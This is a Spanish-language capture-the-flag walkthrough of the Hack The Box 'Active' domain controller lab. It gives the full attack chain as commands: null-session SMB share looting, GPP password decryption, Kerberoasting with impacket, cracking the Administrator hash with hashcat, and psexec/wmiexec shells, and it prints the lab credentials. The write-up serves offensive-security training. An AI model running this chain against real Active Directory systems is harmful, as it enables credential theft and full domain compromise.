![1](Images/1.png)

Comenzamos enumerando puertos abiertos con nmap.

``sudo nmap 10.10.10.100 -sS -p- --open --min-rate 5000 -n -Pn -oG allPorts``

![2](Images/2.png)

Dados los puertos abiertos, tiene bastante pinta de que es un DC. No obstante, vamos a ver qué servicios y versiones están corriendo en estos puertos.

``nmap 10.10.10.100 -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49163,49174,49176 -oN target``

![3](Images/3.png)

Confirmamos que es un DC. A su vez, podemos empezar a ver cositas, como que el dominio es active.htb. Para recopilar un poquito más de información vamos a hacer uso de netexec.

``netexec smb 10.10.10.100``

![4](Images/4.png)

Confirmamos que el dominio es active.htb, que la máquina se llama dc y que tiene un WinServer 2008.

Añadimos esta información al /etc/hosts.

![5](Images/5.png)

Para continuar enumerando información que pueda ser de utilidad, vamos a intentar ver qué recursos se están compartiendo:

``netexec smb 10.10.10.100 -u '' -p '' --shares``

![6](Images/6.png)

Tenemos permisos de lectura en el recurso Replication, lo cual es llamativo. Vamos a echar un vistazo con null sesion.

``smbclient //10.10.10.100/REPLICATION -N``

![7](Images/7.png)

active.htb -> Parece la estructura de SYSVOL

Para echarle un ojo más a fondo, vamos a traernos todo lo existente a la máquina atacante.

``recurse ON``

``prompt OFF``

``mget *``

A medida que se van descargando, si nos fijamos, hay algo que llama la atención:

![8](Images/8.png)

groups.xml. Este archivo es muy jugoso porque a veces tiene contraseñas.

Si queremos ver la estructura de todos los datos descargados:

``tree .``

![9](Images/9.png)

Y si echamos un vistazo a Groups.xml : 

![11](Images/10.png)

Vemos claramente una referencia al usuario SVC_TGS y la contraseña encriptada. Para poder romperla hacemos uso de la utilidad ``gpp-decrypt``.

``gpp-decrypt 'CLAVE'``

![12](Images/12.png)

Tenemos la contraseña, y por tanto, las posibles credenciales -> SVC_TGS : GPPstillStandingStrong2k18

Vamos a ver si son válidas con netexec.

``netexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'``

![13](Images/13.png)

Nos pone [+], por lo que son credenciales válidas. Una vez sabemos esto, podemos seguir husmeando para ver qué se esta compartiendo para este usuario por SMB:

``netexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares``

![14](Images/14.png)

Lo único que puede parecer interesante, a priori, es el directorio Users. Si nos conectamos con smbclient con estas credenciales, vemos que es el directorio C:\Users. De hecho, podemos acceder a user.txt dentro del directorio SVC_TGS, pero en un escenario como el de la OSCP no sirve con obtener la flag de esta forma porque no tenemos una consola interactiva.

![15](Images/15.png)

Vale, tenemos unas credenciales válidas, pero no tenemos forma de conectarnos: no hay winRM, no hay RDP y no podemos hacer uso de psexec/wmiexec por falta de privilegios.

Como tenemos credenciales, podemos probar kerberoasting para ver si capturamos algún hash de otro usuario:

``impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS``
-> Password: GPPstillStandingStrong2k18

![16](Images/16.png)

Ojo. Tenemos el TGS del usuario Administrator. Si conseguimos descifrarlo, está hecho. Nos copiamos el contenido en un archivo. Ej: admintgs

![17](Images/17.png)

Buscamos en hashcat el código para el TGS-REP (``krb5tgs$23$``):

``hashcat --help | grep -i "kerberos"

![18](Images/18.png)

Lanzamos hashcat con rockyou como diccionario.

``hashcat -m 13100 admintgs /usr/share/wordlists/rockyou.txt --force``

![19](Images/19.png)

Lo ha sacado. Tenemos contraseña del usuario Administrator : Ticketmaster1968

Validamos credenciales con netexec:

``netexec smb 10.10.10.100 -u 'administrator' -p 'Ticketmaster1968'``

![20](Images/20.png)

Nos aparece pwned para smb, por lo que podríamos utilizar wmiexec (para acceder como administrator) y psexec (para acceder como nt authority\system):

Ejemplos:

``impacket-wmiexec Administrator@10.10.10.100``

-> Password: Ticketmaster1968

![21](Images/21.png)

``impacket-psexec Administrator@10.10.10.100``

-> Password: Ticketmaster1968

![22](Images/22.png)


Recogemos la flag de usuario en: C:\Users\SVC_TGS\Desktop:

![32](Images/23.png)

Y por último, recogemos la flag de Administrador en C:\Users\Administrator\Desktop:

![24](Images/24.png)
